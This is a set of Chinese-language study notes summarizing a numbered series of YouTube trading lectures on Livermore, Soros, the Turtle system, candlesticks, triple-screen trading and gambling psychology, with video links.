《华尔街45年》精华部分(3) 在高低点上移时买入（开仓），下移时卖出（道式理论） 牛市中趋势的变化（重大日期，节假日） 最安全的买卖点：W底、M头，2B点（《专业投机原理》） 快速运动中的利润 看似平谈无奇，真理就在其中 https://www.youtube.com/watch?v=Rw5or5MKiSM 47 巴菲特，格林厄姆，查理芒格价值投资理念格林厄姆（老师）：1894年出生，1914年毕业于哥大，1923-1929 辉煌（百万富翁）1929-1932破产，抄底，亏损70%-80%1939-1949，出书，《证券分析》，《财报解读》，《聪明的投资者》 指数法：多元投资 预期法：获利前景 安全边际法：内在价值一定要大于价格 查理芒格（战友）：1924年出生，毕业于哈佛学院，《滚雪球》 盈利预期法 集中：只分析可理解 关联（定价、报表、无形资产），找企业护城河 整体评估 巴菲特：5个原则：行业、企业、价格、长期持有、适当分散 https://www.youtube.com/watch?v=hZRXWQNGyk8 48 乔治索罗斯巴菲特（神）索罗斯（魔）：做空，三大战役 1930年出生，匈牙利人，1944年（14岁）逃亡至英国，1949年考上伦敦经济学院，1956年移民美国（证券分析），1973年成立基金（26年），1979年量子基金（哲学）（测不准原理）1992年狙击英镑（20亿美元），1997年泰铢引爆亚洲金融危机，2012年做空日元（10亿美元），伟大的慈善家（80亿美元） 卡尔波普（哲学家）： 反归纳主义（有限不能证明无限、过去不能证明未来） 科学与非科学（证伪主义） 三个世界：物质世界、精神世界、物质和精神世界的结合（美术金融） https://www.youtube.com/watch?v=p3hjQnmDld0 49 索罗斯反身性理论《金融炼金术》反身性理论 参与者：思想，偏见、偏激，未知量现实：基本面、财报，参与者参与过程，已知量相互干涉的过程，反身性 投资理念：当市场大幅偏离、背离、共振时重仓 https://www.youtube.com/watch?v=aK5R97gNqrM 50 伟大的杰西利佛莫尔(1) 一生故事（四起四落）1877年出生于美国，农场主儿子，贫穷（小学毕业）1890年（13岁）杂工、擦黑板、行情记录（2年的记录数字行情）1892-1899，从 3.12 赚到 1万美元（15岁）1900-1901，亏光1万，又赚5万，又亏光了（23岁）1906年，做空太平洋铁路，赚25万1907年，做空股指，大赚100万？300万？1908年（31岁），做多棉花，亏损加仓，摊成本，亏损，破产1915年（38岁），东山再起，7年1915-1916，38岁，14.5万，39岁，300万1917年（40岁），给家族买了80万信托基金，又赚了150万1922年（45岁），《股市大作手回忆录》1929年，华尔街大崩盘，赚了1亿美元（当年美国财政收入45亿）（相当于2018年687亿）1931-1934，（抄底，政策不允许/限制做空），破产1935年，家庭，老婆开枪打死小儿子（酗酒）1939年，《如何在股市中交易》1940年，自杀（看到自己的父亲尸体，父亲去世后自杀） 自律 -&gt; 失控 https://www.youtube.com/watch?v=GhQM-6sTv0g 51 杰西利佛莫尔 交易方法及关键理念《股市大作手回忆录》1922《如何交易股票》 （丁圣元译） 方法： 突破法（最小阻力），外力（波动率加大） 关键点：进场：突破失败，回抽；纯突破出场：高点不再创新高；波动突然加大，向下关键点突破 资金策略：盈利加仓（止损） 经典句子：人性是永远不变的，市场也不变。一定要慢半拍，不要去预测市场。控制情绪，耐心等待机会，耐心等待关键点的出现，耐心获利。绝对不要拉均价，绝对不要亏损加仓。绝对不要听小道消息、内部消息。 https://www.youtube.com/watch?v=lCKcC3XpyWM 52 比特币分析 (2018-12-26) 周线，日线，60分钟，5/15分钟，盘口买/卖 有仓位（币）：止盈：趋势线，支撑与压力（量价），1/2, 1/3, 2/3线 没有仓位（币）：顺势交易：共振点（周、日、60、5分钟同一方向）逆势交易：顺大势、逆小势（关键点） 开仓买/卖：止损点在哪？ https://www.youtube.com/watch?v=OycHeGg62WA 53. 盘口交易法及炒单（唯一小资金变成大资金）高频交易：人工 50-200，计算机：几千次屠龙刀 手续费：低（返手续费）关键！！！ 长时间经验摸索（几个月~1年到数年） 每天交易至少数十次/百次，性格，忍耐（几十次止损） 国家（手续费）/品种（特征）/平台能看到的信息 https://www.youtube.com/watch?v=2UNKCWNYhxg 54. 盘口交易法及炒单方法（高频交易）网名：初级炒单，一缕青烟，侯婷婷；公羽捷，翁文捷，何俊（何天王） 判大方向：日线、分钟线（趋势：单边；振荡：双向） 记四价：昨日开盘价、收盘价、最高价、最低价，（今开盘） 判强弱：没有涨跌，只有强弱 开仓点： 1 支撑/压力点位/量能（意向） 2 看挂单/五档买卖盘（意向） 3 看成交记录（实实在在）开仓/平仓（大单/吃单速度/密度） 止损 https://www.youtube.com/watch?v=3oLYgqc87hc 55 总结（十年总结）金融交易赚钱核心秘密 是什么？赚钱 5%（杠杆），20%（股票）。亏损占绝大多数 为什么？门槛：门槛越低，赚钱越难（赌博、金融交易）（无时间要求、无专业、无纪律、无限制）。门槛越高，赚钱越容易（医生、律师、高级翻译、科学家、工程师）。符合哲学自然规律。 怎么办？学习，迷宫理论，第一步金字塔认知结构：赚钱核心秘密方法，规则，概率，情绪控制 方法，规则：每个人观念不一样，感激不同观念的人，观念/方法越认同，方法越难交易 （80%）概率：止损，（方法既有用又无用），资金比例 （15%）大部分亏损者都是对随机激励的上瘾，和小概率事件的痴迷。（照顾疯老太太理论）情绪控制：生理控制（多巴胺），心理控制（宗教、哲学） （5%） 认识概率，控制情绪，知行合一 https://www.youtube.com/watch?v=iY8OzJ92hoI 57 K线的画法，关键K线的意义K线只是规则的载体，离开规则谈K线毫无意义 历史：1750年左右，日本，本间宗久，米商（K线记录4个信息）1960-70年代，史蒂夫尼森，引入华尔街（点线图；分时图；竹节图；柱状图） 周期：（月、周、日、小时、30分钟、15分钟、5分钟）4个信息（开盘价、收盘价、最高价、最低价） 画法：阳线：大阳、下影线大阳、上影线大阳、上下影线大阳、十字星、锤子、倒锤子*阴线：大阴、上影线大阴、下影线大阴、上下影线大阴、十字星、锤子、倒锤子* 有价值：大阳、大阴、锤子、倒锤子（V型反转）、波动很大的十字星资金作盘（流入） https://www.youtube.com/watch?v=hvUtGI3rqkc 58 看清K线组合实质《本间宗久秘录》三川、三山、三空、三兵、三法 三川：底部 三山：顶部 三空：跳空（缺口） 三兵（三个红小兵、黑小兵）：45%趋势 三法：盘整，中继 吞没：看涨吞没，看跌吞没（突破） 孕线：看跌孕线，看涨孕线 反转：下跌反转、上升反转（M顶、W底） 乌云盖顶/断头砸刀 https://www.youtube.com/watch?v=06C5dEQVLbM 59 K线核心用法 K线、关键K线、大阳/大阴/锤子/倒锤子、位置 交易规则（交易系统）+关键位置+关键K线 交易系统：趋势线突破形态突破W、M、三川、三山突破支撑于阻力（点位）百分比回调（点）均线（金叉死叉）指标：MACD、KDJ、布林线、量比 关键位置：前位、后位 关键K线：只有后位有意义 本间宗久四大原则：风林火山风：疾如风 —— 转折（快）林：徐如林 —— 盘整（慢）火：掠如火 —— 突破/加速（加仓）山：不动如山 —— 持续（抱紧头寸） https://www.youtube.com/watch?v=nFRBghQNqLA 60 《海龟交易法》(1)之理查德丹尼斯和他的海龟们17岁，做委托单的传递（跑腿），学习，用父亲账户操作（不到 21 岁）场内场外，亏损，期间完成哲学学位23岁，买交易席位，1200 美元 + 400美元（赚了1亿美元）26岁，400 USD -&gt; 3000 USD -&gt; 100K USD -&gt; 500K USD -&gt; 1M 美元 正确的方法 + 历史给的机会 = 暴赚/第一桶金 1972-1973年，苏联粮食大劫案。苏联买了美国 30%的粮食，粮食疯狂涨价。 35岁，亿万富翁，《海龟计划》，哲学思考，优秀的交易员是天生的还是后天培养的？丹尼斯，威廉，打赌，实验 新加坡养海龟，人工培养 1000人里选 12 + 10人（22个人，淘汰2人），1周培训，1个实盘测试，25万美元-200万美元初始资金。结果：20个人每年100%盈利，赚数亿，其他公司做基金经理 教训： 1978年失败，亏50%，个人 1987年，基金亏50%，个人（据说）亏90%，海龟团队解散，1988年丹尼斯金盆洗手退出金融界 原因：采访，黑天鹅（顺空），高开 40% https://www.youtube.com/watch?v=OWSf_Jwdmko 62 《海龟交易法》(2)趋势交易法： 点位突破（前高点）杰西 趋势线突破 形态突破 W底M顶突破与逆转 通道突破（唐奇安、布林线） 海龟交易法 均线系统 四周法则 三重滤网 点位交易法（百分比）（斐波那契点位） 量化交易法：开仓点（头寸规模）止损点加仓点平仓点 趋势突破，坚定止损，盈利加仓 买什么？（低关联、流动好、容量大） 买多少？（头寸单位 U） 单一市场：4U关联市场：6U低关联：10U最多同方向：12U 1234567头寸规模（U） = (账户 1%)/市场绝对波幅 市场绝对波幅 = N * 合约每一点所代表价值N = (19*PDN + TR)/20PDN: 前一日 N 值TR（真实波幅）= 最大值（当日最高价 - 当日最低价， 当日最高价 - 前一日收盘价，前一日收盘价 - 当日最低）TR = max(H-L, H-PDC, PDC-L)（前期波动率大少买，前期波动率小多买） 什么时候买？短线：价格超过20日最高价（做空反之）长线：价格超过55日最高价（做空反之） 止损：2N 加仓： 0.5N 的间隔每次增加 1U 单位 平仓：短线：10日最低价（做空反之）长线：20日最低价（做空反之） 海龟交易法的问题： 趋势的稀缺性，特别是单一品种 低胜率对执行力的考验 大幅回撤反人性，对持仓的考验 https://www.youtube.com/watch?v=P_7dqLHySF8 63 《混沌交易法》混沌与分形经典牛顿物理学：宇宙由自然规律、数学支配量子力学（20世纪20,30年代）：微观上不可测量，概率性存在。（索罗斯：量子基金）混沌理论（20世纪60,70年代）：宏观上不可测量（人口移动、化学反应、社会行为、金融交易）历史： 19世纪末：庞加莱，三体问题 20世纪60年代：气象学家洛化兹，蝴蝶效应 费根鲍常熟：周期加倍金融学：社会行为+大众心理（混沌中的混沌） 金融市场的不可预测性，止损的理论基础 混沌理论的特点： 能量永远会遵循阻力最小途径（杰西利佛莫尔） 始终存在不可见的根本结构，这个结构决定最小阻力路径 根本结构可被发现，且可以被改变技术交易，分形（重要） https://www.youtube.com/watch?v=9640U79EPSU 64 《混沌交易法》混沌与分形实战运用（精华） 不同周期经典分形无处不在 最小周期（1分钟，5分钟，15分钟，60分钟，日线，周线，月线），分形与最大周期具有相似性（开仓、平仓，交易规则） 小级别分形构成大级别分形的一小部分 周期共振往往是出大行情的机会 分形结构： 两段式分形 N字分形 M、W分形 M、W突破回抽分形 形态结构分形 最经典结构（理查德沙贝克） 混沌，找到一种模式，确定规则 分形结构（客观、混沌）+交易规则（可控）+止损（可控）+一致性（可控）=成功 https://www.youtube.com/watch?v=izA9iPEhfoo 66 《我如何在股市中赚了200万美元》 尼古拉斯达瓦斯箱体理论1920年，匈牙利，布达佩斯出生1943年，逃到土耳其和欧洲，与同父异母妹妹跳舞为生1952年，史密斯兄弟6000股（每股0.5美元）作为酬劳，0.5涨到1.9美元，赚了8000美元。看200本书，每天8个小时1957年-1958年，从市场上赚了200万美元1959年，《时代杂志》采访，成名，写书 “How I made $2 million in the stock market?” “Wall Street, the other Las Vegas”(《我如何在股市中活了下来》)1960年，被调查，争议（书，误导，22万美元？） 学习交易的四个阶段： 赌徒：听消息，找“专家”，看“选股”杂志，“精英”荐股（预测）。无方法、无规则、无纪律。（亏损） 基本面分析：收益，财报，市盈率。（亏损） 技术面分析：价格变动，突破后的走向。200本书，买卖实践，箱体理论。（成功） 基本面和技术面相结合：有前途的行业+突破。1957-1958。（成功） https://www.youtube.com/watch?v=IjPnzEkFdSI 68 尼古拉斯达瓦斯箱体理论演变、定义、实战定义：股价在高低点之间波动，围绕波动区间画的区域就代表一个箱体。 买卖点：开仓：突破箱体，箱体内止损：箱体突破点往下几个价位加仓：突破后盈利，下一个箱体neilliu平仓：突破最后一个箱体下沿 试验：两次盈利、一次亏损 总结： 市场不可预测 坚定止损 盈亏比 移动止盈 修正：开仓：成交量扩大+突破+基本面止损：箱体理论加仓：箱体理论平仓：移动止盈 实战：罗瑞拉德香烟布鲁斯实木板 “我绝不卖掉一支正在上涨的股票” 问题： 1957-1958年大成功（大牛市）熊市：稳定的亏损 定义不明确 https://www.youtube.com/watch?v=Fc7eEfsok2E 70 《旅行•交易》道德排第一，智力，学历和金融专业并非交易成功必要条件https://www.youtube.com/watch?v=psvfwyTEWZM 73 《旅行•交易》过度追求胜率和过度优化交易系统的陷阱（美国波士顿)https://www.youtube.com/watch?v=RcyxSxUH9XA 75 《旅行•交易》什么是大数法则？大数法则对中高频交易有什么指导意义？https://www.youtube.com/watch?v=dMMqSXkcoL8 76 《旅行•交易》什么是赌徒谬论？为什么高手都强调不要亏损加仓？https://www.youtube.com/watch?v=18p0U_mUAuU 77 《旅行•交易》一年50倍利润有可能吗？快速暴赚的陷阱？https://www.youtube.com/watch?v=NqX3NCmTv78 80 三重滤网交易系统讲解亚历山大埃德尔，《走进我的交易室》问题（为什么？）： 市场没有圣杯，一个指标不足以解决问题 不同指标之间相互矛盾（趋势、震荡指标矛盾） 不同时间周期也相互矛盾 同时符合 -&gt; 开仓 前提：界定你的时间周期（长线（周线、日线、60分钟）、中线（日线、60分钟、15分钟）、日内（60分钟、15分钟、3分钟）） 一层滤网：周线 MACD 来判断，MACD 斜率二层滤网：日内的震荡指标（劲道指标、艾达透指标、随机指标、KDJ、RSI、William）三层滤网：日内分时，盘中分时 开仓核心：顺大、逆小、破位 平仓核心：长线周趋势反转，短线日内趋势反转 止损核心：日内高低点设止损 做多： 周线 MACD 斜率向上 日内震荡指标（KDJ）向下（低值） 日内盘中向上 做空： 周线 MACD 斜率向下 日线震荡指标向上（KDJ、RIS、……） 盘中向下突破 https://www.youtube.com/watch?v=qyEuurOhMHE&amp;t=5s 83 均线、百分比线为基础的三重滤网系统核心：顺大、逆小、突破（确认：K线、量能、盘口）时间周期（选线），4倍左右时间差：周线、日线、60分钟（长线）日线、60分钟、15分钟（中短线）60分钟、15分钟、3分钟（日内交易） 均线为基础：假设、想法均线：成本均价，粘合、金叉/死叉、发散、粘合、金叉/死叉开仓：周线（多头），日线（空头），60分钟（多头）止损：60分钟K线支撑（最小级别）平仓：60分钟（最小级别转为空头排列） 百分比线为基础：（理论基础：江恩、波浪、道式）开仓：周线（多头），日线（1/3, 1/2）,60分钟（K线确认）止损：60分钟K支撑处（最小级别）平仓：60分钟趋势线/M头，单/双跌破 任何一个交易系统方法都有弱点（命门），针对弱点注意： 亏损加仓，不止损（心态、纪律） 不给你回调机会 https://www.youtube.com/watch?v=8IwmTyPqiB8 85 如何判断交易中陷入病理性赌博？赌博：自控的，概率性的：愿赌服输，不上瘾病理性，无法自控，不自知：越陷越深，倾家荡产，跳楼 病理性赌博是什么？ 难以控制的参与欲望，赌博前的紧张感与行动后的轻松感 有时并非为了经济收入（欲望、刺激） 不断加大赌注 可以隐瞒其赌博成瘾的状态与程度 结论：80%、90% 的亏损者都是病理性交易者而不自知 为什么？ 佛罗伊德潜意识（《梦的解析》）：童年时期不受约束的排泄行为被父母严格管教，赌博在成年后成为替代品，用于代替不受约束的快感 汉斯冯哈丁伯格：赌博行为性欲化，因为赌徒天生俱来的被虐狂或者他们期待惩罚降临的恐惧中的快感 随机强化：间歇式随机强化，行为成瘾 多巴胺分泌:：生理成瘾 沉默成本（经济学）：对于已投入的损失的依恋 https://www.youtube.com/watch?v=UtnCALL88nI 87 病理性交易（赌博）的解决方案自我意愿（邓宁——克鲁格心理效应） 愚昧山峰（不知道自己不知道）绝望山谷（知道自己不知道）开悟之坡（方法+实践，知道自己知道）持续平稳高原（不知道自己知道） 内求： 承认自己是个输家，对市场无能为力 彻底放下，将关注转到专注亏损；每次开仓先计算亏损，问自己想亏多少？ 外求： 互助协会（酒精互助协会） 信仰（宗教）（家人）（其他）强大的力量可以让自己战胜 分散精力，身、心、灵平衡 https://www.youtube.com/watch?v=GidhcEiyNyk 88 《专业投机原理》趋势转折123法则维克托（victor speradeo）介绍：1200本，战胜市场不可取 高中学历，进修大学前做交易 专业扑克牌玩家 持续12年盈利 11年学徒 赚钱核心秘密：分析状况，掌握胜算，知道如何下注，保证自己在输的情况下，能参与下一场赌局（交易）。（风险，概率，胜算，止损）工具：技术分析，统计方法，基本面。 技术分析：归纳重复发生一种价格的模式，这种模式之所以产生，因为市场参与者在做决策时，具备类似的心理活动。（行为心理学） 趋势转折判断123法则： 趋势线被突破 上升趋势不在创新高；下降趋势不在创新低 突破M头或W底 问题（弱点）： 完全符合时，行情已经走了一段 本质上还是逆势交易（可以应用于逆小势） 2B法则（次低点2B）： 逆势 盘整反复 配合K线、量能 https://www.youtube.com/watch?v=1HeE3CHpzpY 91 比特币“完美”操作行情（复盘）技术工具： 突破失败 2B 量能 123法则，逆转与持续 形态 趋势线 江恩数字 波浪理论 顶部 2B 河宽 止盈： 第一批，量压力位 第二批，趋势线跌破 第三批，123法则 https://www.youtube.com/watch?v=base3LakEhw 95 选股策略（技术面与基本面共振）股票历史（以史为鉴）：荷兰东印度公司，集资，回报三大金融泡沫：英国南海，荷兰郁金香（期货），法国密西西比公司，美国股灾（1929），比特币 基本面：理论模型，供求关系，结果技术面：市场情绪 二元对立 《乌合之众》，随机漫布，索罗斯反身性 技术面方法： 趋势突破（趋势线，量能，均线） 形态突破（W底、M顶，三角形、平行四边形） 顺势回调（三重滤网、百分比回调） 趋势反弹（2B、破底翻，波浪，江恩，缠论，谐波，裸K） 基本面方法： 指数法 预期法 安全边际法（估值大于价格（熊市）） 行业，周期，政策，公司（净资产（高）、市盈率（PE）（低）、公积金（高）、股本，流通盘（中等）、庄家控筹（高）、行业调查） A股： T+1（当天买的，第二天才能卖） 涨跌限制：10% 不能做空 国外： T+0（当天买，当天卖） 无涨跌限制 双向（可做空） 逼空 https://www.youtube.com/watch?v=BquC0so_v9A 97 《幽灵的礼物》三个核心规则1996年美国《期货杂志》论坛上的一名神秘大咖 小亮点： 场内交易员起家（剥头皮交易员、抢帽子）（实践） 去做，不要想（执行力） 其他输家交易员例子（一致性） 规则一：只持有正确的仓位（时间止损：15分钟） 不要等出现损失，立即清除不正确的仓位 永远不要等市场提醒你已出错 交易是失败者的游戏，你要学会去输 直到被市场证明之前，我们都假定自己是错的 规则二：毫无例外的正确加码才能获利加码公式（3:2:1，原始仓位:加码比例:再加码）加码时间：日内交易（回调、突破），中长线（突破加码） 规则三：巨量即是套现时机（巨量后三天内全部清仓） https://www.youtube.com/watch?v=vY1zLa5HVWY 98 杰西利佛莫尔，马丁舒华兹，华尔街幽灵共同推崇的联动交易法赚百万美元的联动交易法 定义：若干相关联的事物一个发生变化，其他也跟着运动变化，联合行动。种类：期股联动，政策联动，板块联动，相关产品联动，其他秘密联动。 上涨：主动做多，空头被动平仓下跌：主动做空，多头被动平仓 案例1:1907年杰西做小麦、玉米（供求关系） 小麦：做空1000万蒲式耳 玉米：做空1000万蒲式耳 联合机构做空燕麦 案例2:1925年杰西做小麦和黑麦 黑麦总是长得快，现在反了 测试卖单，下跌3分，回到2分，再次下跌3分，回1分 黑麦没有庄家保护，小麦也不会 案例3:马丁舒华兹股指期货国债现货涨-&gt;利率跌-&gt;股价涨-&gt;标准普尔500股指期货涨（基本面）时间差：国债期货15:00收盘，股指期货16:15收盘配合T指标、均线、震荡指标一起用（技术面）一招鲜，赚取140万美元 案例4:幽灵，选择弱市场中强烈上涨的标的卖出 案例5:央视《期货时间》节目生某某：胶合板、纤维板任先生（赌徒）：各产品联动，整个市场都起来的时候再做 案例6:美元兑本国货币期货与股指期货联动 案例7:股指标准合约与股指迷你合约 https://www.youtube.com/watch?v=9UZqHKDGC34 99 墨菲法则，《黑天鹅》《我如何搞垮了巴林银行》墨菲法则 1949年美国工程师墨菲提出的 前提：时间足够长，样本足够多 定义：如果事情有变坏的可能，无论这种可能性有多小，它总会发生 通俗： 担心的事情总会发生，怕什么来什么 福不双降祸不单行 交易里的意义：小概率时间必然发生，在所难免我们要理解并做好准备 黑天鹅（小概率事件） 来历 特点： 稀有性 冲击性 事后可预测性 认知缺陷： 正式谬误 叙述谬误 假装黑天鹅不存在（选择性忽视） 沃顿商学院的数量金融学家： 我相信我完全无法预测市场价格，并且其他人也不行 我永远不可能知道未知，因为从定义上讲它是未知的，但是我可以猜测到他的影响 几乎社会生活中的一切都是由极少发生的，但是影响重大的震动和飞跃产生的 《短线交易秘诀》（大区间、小区间） 我如何搞垮了巴林银行 尼克李森，28岁交易员搞垮了一家233年历史的银行（1803年成立，法国买路易斯安那州，皇室）1989年摩根斯坦利的后勤，机遇1989年巴林银行，印尼（信任），新加坡1989年场内交易员，给客户下单，买错合约 2万英镑亏损（双账户） -&gt; 6万 -&gt; 15万（乔，出错） -&gt; 167万 -&gt; 2300万 -&gt; 5000万 -&gt; 13亿美元 日经指数，生死一搏，地震，暴跌，太便宜了（越跌越买，补仓） https://www.youtube.com/watch?v=WfhbKmh3eSg 100 镜像 明理 自律 接受 臣服 欢喜https://www.youtube.com/watch?v=nLbizjTy7ow 101 《短线交易秘诀》(1) 介绍及其理念作者：拉瑞威廉姆斯（Larry Williams） 为什么？鄙视与吹捧，正确看待？，短线/日内是打基础的入门联系，无关对错 性格/实践长期大量练习：学会看日线，转向中长线；喜欢短线无风险，坚持短线 拉瑞威廉姆斯介绍、争议(1) 1万美元到100万美元(2) 女儿16岁也是期货比赛冠军(3) 澳大利亚，偷税150万美元 经历技术指标 -&gt; 形态 -&gt; 图表 -&gt; 动量 -&gt; 只关注价格变动？ 核心(1) 单纯关注价格（指标？形态？量？）(2) 做减法 理念(1) 价值就是市场愿意支付的价格，价值无常（300万美元学费）(2) 熬过最难的日子（资金管理）(3) 我们无法预见价格变动，但可以学会控制自己的损失(4) 市场永远在变化，我们要主动学会适应(5) 专注，果断开仓（不要想）(6) 我认为我现在所做的每一笔交易都会亏损，而且亏得很大！ （毫无意外的）小亏损（错误止损） + （意外的）大盈利 + （毫无意外的）成功止损 https://www.youtube.com/watch?v=6u0fQJG0asc 102 《短线交易秘诀》(2) 日内交易计划及策略概念： 大价格区间（趋势），小价格区间（盘整），周期循环 开盘价重要意义（生死线，多空分水线）（开盘价之上不要做空，开盘价之下不要做多） 价格活动爆炸点（大K线，大阳、大阴） 均线、百分比线、压力支撑、量能累积点 操作要点： 大区间产生小区间，小区间产生大区间，无限循环 我们尽量在大区间日赚钱，大区间日一般高开高走，始终在开盘价之上（只多不空），或者低开低走，始终在开盘价之下（只空不多） 如果计划做多，不要想低于开盘价很多买，并幻想会下跌再猛拉，如果计划做空，不要想高于开盘价很多去空，并幻想会上涨猛跌 大区间日通常收盘价接近量价或等于最高价（反之亦然），一定要持有到收盘！！！ 交易次数越少越赚钱，放弃某些交易日（周一、周四、周五交易），放弃双向交易，尽量只做一个方向 https://www.youtube.com/watch?v=D9vMBETACvw 103 《短线交易秘诀》(3) 日内交易计划及策略实战演练 顺势，大区间，只做多，突破 顺势，小区间，只做多，均线、百分比量、三重滤网 逆势，不做？放弃，做？准备亏损，极端，反做 量子，波函数，概率网 https://www.youtube.com/watch?v=jdPdMaEdjLc 104 《旅行·交易》治疗成瘾的三种科学方法https://www.youtube.com/watch?v=Ao2UGZAcuu8 105 《短线交易秘诀》（4）赚钱高概率形态 如何避免头肩形态的反复止损(1) 周期共振(2) 顺大逆小 是否需要区分短线、长线不是你决定的，是行情决定的性格决定一切认清自己，找到适合自己的方法 趋势线角度的变动问题 如何学习周期多周期切换（混沌、分形） 105 《短线交易秘诀》（5）赚钱高概率形态开仓点总结：利用市场极端情绪形态，价格反转中建仓 突破 回调（顺大逆小）：均线、百分比线、布林线收敛、指标背离 反转：2B、123法则 攻击日形态：影线次K反转“哎呀”形态（2B的一种）：影线次日缺口回补孕线（外包线） https://www.youtube.com/watch?v=IcIc9lXqsFM&amp;t=18s 108 《短线交易秘诀》（8）投机要点总结(1) 富人不下大赌注，赢家持续地做正确的事来获得利润(2) 市场经常由无方向的自由形态组成，投机适合过山车爱好者，但要控制寻求刺激的心态（波动、概率）(3) 如果没有耐心等待，就什么也得不到（耐心者的游戏）(4) 交易需要理由，而不是快感（当前的快乐高于成本，就会产生多巴胺并上瘾）(5) 如果不能执行，交易系统和策略毫无用处(6) 如果你在游戏中拥有优势，参与时间越长，获胜概率就越高（赌场/交易，正期望值为正，大数法则）(7) 我们从来不曾，也永远不知道什么时候能赚钱(8) 成就（自尊心）会杀人，不能让成功冲昏头脑，注意力集中在严格执行规则，而不是结果(9) 我们任由信念系统凌驾于现实之外，就会有重大亏损(10) 恐惧（恐惧源于未知，靠知识、学习战胜），贪婪（） https://www.youtube.com/watch?v=NG3u3HhjkmY&amp;t=9s 109 《交易冠军》（1）赌徒，分析师和场内交易员马丁·舒华兹8岁，交换棒球明星卡10岁，铲雪赚钱15岁，玩扑克，赌马（自控）大学，欧洲小赌（概率）毕业，拉斯维加斯 赌场希望你靠直觉和冲动、勇气来赌，而不是头脑、自律、智慧（酒精、美女、音乐） 赢家必须严格遵守规则（自律） 比其他玩家知道得更多（学习） 充分休息，保持头脑冷静 绝不下大注（小仓位） 无论结果如何，人人都想未卜先知，但这是不可能的（不预测） 把自尊心与赌博游戏彻底分开 管理好你的资金 在接二连三的赢钱后换张赌桌（周期） 9年半的基本分析师，市盈率、财务状况、应收款（庞氏骗局）（案例：报告、泄密），一直亏损，工资养家1979年开始（短线）场内交易员（抢帽子、剥头皮），技术分析为主，10万、60万、100万大赚，1982年开始做股指 方法： 动量交易法，价格涨跌异常，SP（股指）在3个时间单位中连续上涨 0.5, 0.3, 0.1 点。（波动率，爆炸点，突破大区间） 指标：T指标，10日均线，震荡指标，KD线，通道线，拐点，趋势线 关联交易：利率，国债，股指 《理念·哲学》价格波动实质，缸中之脑，专注当下，向死而生宏观经济 经济增长 经济周期循环宏观政策 货币政策 财政政策 市场利率 通货膨胀国际收支 汇率变化 国际收支行业情况 行业内部因素 行业周期公司内部 公司内部治理 公司外部竞争力 财务状况 公司重组、整改市场行为 政治及不可抗因素 市场大众心理 国家突发消息 人为操纵 行为偏见黑天鹅 黑天鹅（主力下错单） 思想、正确、偏见、妄想 =&gt; 下单 =&gt; 盘口 =&gt; K线，价格波动 =&gt; 技术，短期震荡指标（KDJ，RAS），长期趋势指标（均线，MACD），形态（三角形、通道、趋势线、支撑压力） 笛卡尔：我思故我在 缸中之脑（放下我执） 向死而生出生 =&gt; 死亡开仓 =&gt; 亏损 做人、交易、活得好的关键：关我P事，关你P事 只做属于我的行情 市场的走势与你无关 110 《交易冠军》（2）巨亏百万，交易冠军崩盘大逃亡1982年，指标超买，“我认为……”，风险控制官逛街，一天亏损100万美元 1983年开始参加期货比赛。第一次，第二名，赚140万USD；第二次，收益254.9%，48万赚122.2万；第三次，443.7%方法： 关键价位分批建仓，分批了结 掌握时机，速战速决 决不在市场疯狂波动时进场 盈亏比 1:1 左右就可以进，合理的小亏和金额较大的盈利快速止损 1987年大股灾，市场崩盘，做日内躲过大跌，一直到…… 打电话问交易所（盘口核心）（灵魂三问，赚钱三问）： 成交量多少？ 买家卖家数量多少？ 新开仓还是在止损或平旧仓？ 平空单40手，亏31.5万美元！之后一周所有他用的指标全部失效！停止交易。 （大量研究后的）“直觉交易”做空 12 手，赚 18 个点，29万美元。 盘口带动K线，K线带动指标 112 《交易冠军》（4）交易技巧总结前提1：了解自己的性格优点：努力工作，遵守原则，长时间集中缺点：不安全感，害怕亏损，希望总胜个性弱点是致命的！不适合基本面 前提2：从短线开始训练，5分钟内进出从不持有头寸超过几个小时（日内短线）盈亏比（1:1）：止损快，赚钱快，胜率高拳击手比喻：积少成多（炒单，短炒） 股价净变动指标（Net Ticks Index） 2800（1800涨，800跌）=&gt; 1000 极端情况，反向指标（新闻、突发消息、电脑程序单） 短线操作指标（Short Term Trading Index） TRIN = (上涨数量/下跌数量)/(上涨量能/下跌量能) QCHA 指数 背离，指数涨，QCHA跌，出手 订阅其他优秀交易员的周分析 10日均线 均线上尽量做多，均线下尽量做空，慢慢靠近均线，再站上均线，就是新趋势开端 找市场拐点，确认要承担的风险 利用通道线（布林线？） 移动均线上下各加减1%计算出的，如果价格整体上涨，在价格接近下沿时，在低点找机会做多 重视缺口（裂口）：突破，持续，衰竭 缺口如果没有被回补，就是一个强烈的信号，可以建仓缺口方向 4日法则（4K法则），江恩，维克多，马丁，幽灵 连续跌3天，或者连续涨3天，第4天可能回调 出利空不跌，出利多不涨，赶快反着做 突发行情中不要操作，所有方法会失效！ 找最佳交易日（对每个交易进行概率统计） 狭窄区间会被反复止损，操盘手在没有行情的日子，会联合起来专门吃别人止损赚钱，扫完后反向急拉，区间内做高抛低吸 如何做股票： 做多涨幅排行的股票，做空跌幅排行股票（追涨杀跌，落井下石） 在所有人都在卖时（卖单衰竭），就是买入时机（新手注意） 决不买小盘股（人为操作）、弱势股，只买强股回调 每天亲自绘制70支股票技术图，在700支股票里标出趋势线、支撑、压力位，计算点位，计算震荡指标，然后在压力或支撑被触及时，决定是否买入、卖出 秘密：每天收盘后工作3小时以上，写操盘计划，计算各种指标，点位！ 期货债券成功交易案例： 海湾战争期间：股票买入理由（多）： 指标超卖 战争是突发新闻，不会持续 只买绩优股 黄金、原油（空）： 恐慌因素不会持续 利空出尽是利好 债券期货（多）： 原油、黄金下跌 利率下跌 债券上涨 113 《交易冠军》心法总结，专业交易员的一天 冷静客观，理性心态 兴奋过度 =&gt; 警告 情绪化 =&gt; 代价 积累资金，先求保本 积少成多，积小胜为大胜 戒除赌性，自律投资 严格等待机会（计算盈亏比），而不是随便下注 内幕消息，不可信赖 亏损 危机关头，立即行动 顺势而为，灵活应对 随时根据趋势改变头寸 连续亏损，暂时退场 走三退一，所有操盘手都要面对 设立止损，切实执行 嫉妒、愤怒、情绪化、自尊心与情绪分开 判断力 充实自己，坚持自己 行情记录，个性操盘，计划是交易的一部分 有备而来，切勿盲目失败案例（一定要有交易计划） 看淡权威，相信市场波浪理论 披沙拣金，把握咨询学习他人 抛开情谊，客观决策合伙人 化解压力，平衡心态做自己很享受的事情 虚心若愚，少说多干 6:45-7:40 起床，上洗手间，吃早餐，看报纸7:40 分析前一天交割单；对账；看基本面；清空情绪8:15-9:29 